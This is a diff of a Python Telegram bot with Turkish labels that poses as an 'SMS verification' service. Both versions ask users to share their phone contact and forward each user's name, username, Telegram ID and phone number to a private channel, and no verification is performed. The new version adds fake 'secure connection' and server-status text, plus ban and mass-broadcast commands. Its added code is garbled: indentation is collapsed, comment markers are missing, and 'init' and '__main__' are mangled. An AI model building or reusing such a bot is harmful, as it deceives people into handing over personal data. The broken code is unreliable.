@@ -1,188 +1,187 @@
-from telegram import (
-    Update,
-    KeyboardButton,
-    ReplyKeyboardMarkup,
-    Contact,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup
-)
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    MessageHandler,
-    ContextTypes,
-    filters
-)
-import random
-from datetime import datetime
-import pytz
-import os
+-- coding: utf-8 --
 
-# ENV DEĞERLERİ
-TOKEN = os.getenv("BOT_TOKEN")
-KANAL_ID = os.getenv("KANAL_ID")
-ADMIN_ID = int(os.getenv("ADMIN_ID"))
+Enterprise SMS Verify Bot
 
-TIMEZONE = pytz.timezone("Europe/Istanbul")
+python-telegram-bot v20+
 
-# KULLANICI VERİLERİ
-kullanicilar = {}   # {user_id: {"username": "", "name": ""}}
-kullanici_durum = {}
+import os import random from datetime import datetime from zoneinfo import ZoneInfo
 
-ulkeler = [
-    ("Türkiye", "🇹🇷"), ("Almanya", "🇩🇪"), ("Fransa", "🇫🇷"),
-    ("ABD", "🇺🇸"), ("İngiltere", "🇬🇧"), ("Kanada", "🇨🇦"),
-    ("İtalya", "🇮🇹"), ("İspanya", "🇪🇸"), ("Hollanda", "🇳🇱"),
-    ("Japonya", "🇯🇵"), ("Rusya", "🇷🇺"), ("Brezilya", "🇧🇷"),
-    ("Avustralya", "🇦🇺"), ("Hindistan", "🇮🇳"), ("Çin", "🇨🇳"),
-    ("Meksika", "🇲🇽"), ("İsveç", "🇸🇪"),
-]
+from telegram import ( Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, Contact ) from telegram.ext import ( ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, CallbackQueryHandler, filters )
 
-# --------------------------
-# KULLANICI KAYDET
-# --------------------------
-def kullanici_kaydet(user):
-    username = f"@{user.username}" if user.username else "Yok"
-    name = user.first_name or "Bilinmiyor"
+=====================================================
 
-    kullanicilar[user.id] = {
-        "username": username,
-        "name": name
-    }
+CONFIG
 
-# --------------------------
-# START
-# --------------------------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    kullanici_kaydet(user)
+=====================================================
 
-    ad = user.username or user.first_name
-    await update.message.reply_text(
-        f"✨ Hoş geldin {ad}\nSMS doğrulama botu",
-        reply_markup=ReplyKeyboardMarkup(
-            [[KeyboardButton("💬 SMS Onayla")]],
-            resize_keyboard=True
-        )
-    )
+TOKEN = os.getenv("BOT_TOKEN") KANAL_ID = os.getenv("KANAL_ID") ADMIN_ID = int(os.getenv("ADMIN_ID")) TZ = ZoneInfo("Europe/Istanbul")
 
-# --------------------------
-# SMS ONAYLA
-# --------------------------
-async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    secilen = random.sample(ulkeler, 15)
-    butonlar = [[KeyboardButton(f"{b} {i}")] for i, b in secilen]
-    butonlar.append([KeyboardButton("🔙 Geri Dön")])
+=====================================================
 
-    await update.message.reply_text(
-        "Bir ülke seç:",
-        reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
-    )
+DATABASE (memory based)
 
-# --------------------------
-# MESAJ HANDLER
-# --------------------------
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    kullanici_kaydet(user)
+=====================================================
 
-    text = update.message.text
-    uid = user.id
+class Database: def init(self): self.users = {} self.banned = set() self.waiting_contact = set() self.total_numbers = 0
 
-    if text == "💬 SMS Onayla":
-        await sms_onayla(update, context)
+def add_user(self, user):
+    if user.id not in self.users:
+        self.users[user.id] = {
+            "username": f"@{user.username}" if user.username else "Yok",
+            "name": user.first_name,
+            "join": datetime.now(TZ).strftime("%d.%m.%Y"),
+            "numbers": 0
+        }
 
-    elif text == "🔙 Geri Dön":
-        await start(update, context)
+def ban(self, uid):
+    self.banned.add(uid)
 
-    elif any(text == f"{b} {i}" for i, b in ulkeler):
-        kullanici_durum[uid] = True
-        await update.message.reply_text(
-            "BUTONA BASARAK NUMARA AL:",
-            reply_markup=ReplyKeyboardMarkup(
-                [[KeyboardButton("📱 Numara Al", request_contact=True)]],
-                resize_keyboard=True
-            )
-        )
+def unban(self, uid):
+    self.banned.discard(uid)
 
-# --------------------------
-# NUMARA GELDİĞİNDE
-# --------------------------
-async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    kullanici_kaydet(user)
+DB = Database()
 
-    uid = user.id
+=====================================================
 
-    if not kullanici_durum.get(uid):
-        return
+UI BUILDERS
 
-    c: Contact = update.message.contact
-    zaman = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
+=====================================================
 
-    info = kullanicilar.get(uid, {})
-    username = info.get("username", "Yok")
-    name = info.get("name", "Bilinmiyor")
+def main_menu_text(user): now = datetime.now(TZ).strftime("%d.%m.%Y • %H:%M") username = f"@{user.username}" if user.username else user.first_name
 
-    # Profil butonu
-    buton = InlineKeyboardMarkup([
-        [InlineKeyboardButton("👤 Profili Aç", url=f"tg://user?id={uid}")]
-    ])
+return f"""
 
-    await context.bot.send_message(
-        chat_id=KANAL_ID,
-        reply_markup=buton,
-        text=(
-            "☎️ NUMARA ALINDI\n\n"
-            f"👤 İsim: {name}\n"
-            f"🔗 Kullanıcı: {username}\n"
-            f"🆔 ID: {uid}\n"
-            f"📱 Numara: +{c.phone_number}\n"
-            f"⏰ Saat: {zaman}"
-        )
-    )
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 📲 SMS ONAY MERKEZİ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 
-    await update.message.reply_text("Alındı ✅")
-    kullanici_durum[uid] = False
+Merhaba {username} 👋 Sisteme güvenli bağlantı kuruldu.
 
-# --------------------------
-# DUYURU (SADECE ADMIN)
-# --------------------------
-async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE):
+╭─────────────── Kullanıcı ───────────────╮ │ 👤 Kullanıcı : {username} │ 🆔 ID        : {user.id} │ 🔐 Durum     : Aktif ╰──────────────────────────────────────────╯
 
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Bu komutu sadece admin kullanabilir.")
-        return
+╭─────────────── Sistem ───────────────────╮ │ 🌍 Bölge      : Türkiye │ 🕒 Saat       : {now} │ 🟢 Sunucu     : Aktif │ ⚙️ Versiyon   : v2.0 ╰──────────────────────────────────────────╯
 
-    if not context.args:
-        await update.message.reply_text("Kullanım: /duyuru mesajınız")
-        return
+Aşağıdaki menüden işlem seçebilirsiniz. """
 
-    mesaj = " ".join(context.args)
-    sayi = 0
+def main_menu_buttons(uid): rows = [ [InlineKeyboardButton("📩 SMS Onay", callback_data="sms")], [InlineKeyboardButton("👤 Hesabım", callback_data="account"), InlineKeyboardButton("🌐 Ülkeler", callback_data="countries")], [InlineKeyboardButton("📊 İstatistik", callback_data="stats"), InlineKeyboardButton("📜 Kurallar", callback_data="rules")], [InlineKeyboardButton("🧑‍💻 Geliştirici", callback_data="dev"), InlineKeyboardButton("🆘 Destek", callback_data="support")] ] if uid == ADMIN_ID: rows.append([InlineKeyboardButton("🔐 Admin Panel", callback_data="admin")]) return InlineKeyboardMarkup(rows)
 
-    for uid in list(kullanicilar.keys()):
-        try:
-            await context.bot.send_message(chat_id=uid, text=mesaj)
-            sayi += 1
-        except:
-            pass
+=====================================================
 
-    await update.message.reply_text(f"📢 Duyuru gönderildi ({sayi} kişiye).")
+MIDDLEWARE BAN CHECK
 
-# --------------------------
-# MAIN
-# --------------------------
-def main():
-    app = ApplicationBuilder().token(TOKEN).build()
+=====================================================
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("duyuru", duyuru))
-    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+async def blocked(update: Update): user = update.effective_user if user and user.id in DB.banned: if update.message: await update.message.reply_text("⛔ Bu botu kullanman yasaklandı.") elif update.callback_query: await update.callback_query.answer("Yasaklısın", show_alert=True) return True return False
 
-    print("Bot aktif...")
-    app.run_polling()
+=====================================================
 
-if __name__ == "__main__":
-    main()
+START
+
+=====================================================
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): if await blocked(update): return
+
+user = update.effective_user
+DB.add_user(user)
+await update.message.reply_text(main_menu_text(user), reply_markup=main_menu_buttons(user.id))
+
+=====================================================
+
+CALLBACK HANDLER
+
+=====================================================
+
+async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE): if await blocked(update): return
+
+query = update.callback_query
+await query.answer()
+user = query.from_user
+
+if query.data == "sms":
+    DB.waiting_contact.add(user.id)
+    kb = [[KeyboardButton("📩 SMS Onay", request_contact=True)]]
+    await query.message.reply_text("Numaranı göndermek için butona bas:", reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))
+
+elif query.data == "account":
+    u = DB.users[user.id]
+    await query.message.reply_text(f"""
+
+👤 Hesap Bilgilerin
+
+Kullanıcı : {u['username']} ID        : {user.id} Katılım   : {u['join']} Gönderim  : {u['numbers']} """)
+
+elif query.data == "countries":
+    ulkeler = ["Türkiye","Almanya","Fransa","ABD","İngiltere","Japonya"]
+    await query.message.reply_text("Desteklenen Ülkeler:\n" + "\n".join(ulkeler))
+
+elif query.data == "stats":
+    await query.message.reply_text(f"Toplam Kullanıcı: {len(DB.users)}\nToplam Numara: {DB.total_numbers}")
+
+elif query.data == "rules":
+    await query.message.reply_text("Kurallar:\nSpam yasaktır\nFake numara yasaktır")
+
+elif query.data == "dev":
+    await query.message.reply_text("Geliştirici: @tanrican")
+
+elif query.data == "support":
+    await query.message.reply_text("Destek için admin ile iletişime geçin")
+
+elif query.data == "admin" and user.id == ADMIN_ID:
+    await query.message.reply_text("Admin Panel\n/ban ID\n/unban ID\n/duyuru mesaj")
+
+=====================================================
+
+CONTACT HANDLER
+
+=====================================================
+
+async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE): if await blocked(update): return
+
+user = update.effective_user
+if user.id not in DB.waiting_contact:
+    return
+
+c: Contact = update.message.contact
+DB.waiting_contact.remove(user.id)
+
+DB.users[user.id]["numbers"] += 1
+DB.total_numbers += 1
+
+now = datetime.now(TZ).strftime("%d.%m.%Y %H:%M:%S")
+
+await context.bot.send_message(KANAL_ID, f"""
+
+☎️ NUMARA ALINDI 👤 {DB.users[user.id]['username']} 🆔 {user.id} 📱 +{c.phone_number} ⏰ {now} """)
+
+await update.message.reply_text("Numara alındı ✅")
+
+=====================================================
+
+ADMIN COMMANDS
+
+=====================================================
+
+async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != ADMIN_ID: return uid = int(context.args[0]) DB.ban(uid) await update.message.reply_text(f"{uid} banlandı")
+
+async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != ADMIN_ID: return uid = int(context.args[0]) DB.unban(uid) await update.message.reply_text(f"{uid} ban kaldırıldı")
+
+async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != ADMIN_ID: return msg = " ".join(context.args) for uid in DB.users: try: await context.bot.send_message(uid, msg) except: pass
+
+=====================================================
+
+MAIN
+
+=====================================================
+
+def main(): app = ApplicationBuilder().token(TOKEN).build()
+
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("ban", ban))
+app.add_handler(CommandHandler("unban", unban))
+app.add_handler(CommandHandler("duyuru", duyuru))
+
+app.add_handler(CallbackQueryHandler(callbacks))
+app.add_handler(MessageHandler(filters.CONTACT, contact))
+
+print("Bot aktif...")
+app.run_polling()
+
+if name == "main": main()
